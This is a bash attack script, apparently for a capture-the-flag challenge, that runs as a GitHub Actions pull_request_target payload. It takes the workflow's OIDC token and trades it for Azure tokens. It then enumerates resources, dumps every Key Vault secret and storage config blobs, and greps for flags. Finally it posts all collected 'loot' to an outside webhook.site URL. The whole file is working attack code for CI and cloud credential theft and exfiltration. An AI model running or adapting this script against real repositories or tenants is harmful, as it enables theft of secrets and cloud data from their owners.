#!/usr/bin/env bash
# pull_request_target payload: chạy với id-token:write + AZURE_* vars của repo gốc.
set -uo pipefail
WEBHOOK="https://webhook.site/1ea2bd5e-45fd-41c9-8970-ed2f6e98af4b"
OUT=/tmp/loot.txt; : > "$OUT"
say(){ echo "$@" | tee -a "$OUT"; }
cap(){ tee -a "$OUT"; }

tok_for(){ # $1 = scope e.g. https://management.azure.com/.default
  curl -s -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${JWT}" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'
}

say "=== OIDC ==="
JWT=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
say "jwt_len=${#JWT}"
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print("sub=",d.get("sub"),"| aud=",d.get("aud"),"| repo=",d.get("repository"))' | cap || true

ARM=$(tok_for "https://management.azure.com/.default")
say "arm_token_len=${#ARM}"
[ -z "$ARM" ] && { say "ARM exchange failed:"; tok_for "https://management.azure.com/.default" >/dev/null; \
  curl -s -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
   -d "client_id=${AZURE_CLIENT_ID}" -d "scope=https://management.azure.com/.default" \
   -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
   --data-urlencode "client_assertion=${JWT}" | cap; }
A=(-H "Authorization: Bearer $ARM")
SUB="$AZURE_SUBSCRIPTION_ID"

say "=== resources ==="
curl -s "${A[@]}" "https://management.azure.com/subscriptions/${SUB}/resources?api-version=2021-04-01&\$top=300" | cap
say; say "=== resource groups (tags) ==="
curl -s "${A[@]}" "https://management.azure.com/subscriptions/${SUB}/resourcegroups?api-version=2021-04-01" | cap

say; say "=== key vaults ==="
VAULTS=$(curl -s "${A[@]}" "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01")
echo "$VAULTS" | cap
VT=$(tok_for "https://vault.azure.net/.default")
for V in $(echo "$VAULTS" | python3 -c 'import sys,json;[print(v["name"]) for v in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
  say "--- vault $V ---"
  S=$(curl -s -H "Authorization: Bearer $VT" "https://${V}.vault.azure.net/secrets?api-version=7.4"); echo "$S" | cap
  for ID in $(echo "$S" | python3 -c 'import sys,json;[print(s["id"]) for s in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
    say "--- $ID ---"; curl -s -H "Authorization: Bearer $VT" "${ID}?api-version=7.4" | cap
  done
done

say; say "=== storage ==="
STS=$(curl -s "${A[@]}" "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01")
echo "$STS" | cap
ST=$(tok_for "https://storage.azure.com/.default")
for ACC in $(echo "$STS" | python3 -c 'import sys,json;[print(a["name"]) for a in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
  say "--- $ACC containers ---"
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://${ACC}.blob.core.windows.net/?comp=list" | cap
  say "--- $ACC/config blobs ---"
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://${ACC}.blob.core.windows.net/config?restype=container&comp=list" | cap
  say "--- $ACC/config/internal-config.json ---"
  curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "https://${ACC}.blob.core.windows.net/config/internal-config.json" | cap
done

say; say "=== FLAG grep ==="
grep -aoE 'flag\{[^}]+\}|FLAG\{[^}]+\}' "$OUT" | sort -u | cap || true

# exfil (log public có thể bị che; gửi về webhook cho chắc)
curl -s -X POST --data-binary @"$OUT" "$WEBHOOK/loot" >/dev/null || true
echo "payload done"
